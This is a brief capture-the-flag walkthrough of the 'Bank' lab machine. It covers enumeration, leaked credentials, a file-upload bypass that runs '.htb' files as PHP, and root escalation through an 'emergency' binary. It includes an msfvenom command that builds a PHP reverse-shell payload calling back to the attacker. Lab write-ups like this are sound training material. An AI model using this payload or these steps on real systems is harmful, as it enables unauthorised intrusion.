#### Enumeration
- Open Ports port `port 22, 53,80`
- No information gathered from the DNS Server
- Virtual host is guessed `bank.htb` and added to the `/etc/hosts`
- `balance-transfer` directory enumerated
- One file varies in size and reveals valid creds due to `failed encryption`
- The creds are used to login to the `web-app`
- `File Upload` in support page
- Comment found in page source
```html
I added the file extension .htb to execute as php for debugging purposes only
```

#### Shell Obtain
##### Via Metasploit
```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=<your-ip> lport=<listening port> -f raw > shell.htb
```
- Upload the shell.htb in the support page and navigate to /uploads dir to get executed

##### Unintended Way
- In `burp` the support.php contents can be viewed without authentication as it mis-handles redirections


#### Priv Esc
- On running the `emergency` binary, the user is escalated to root group and root shell is obtained
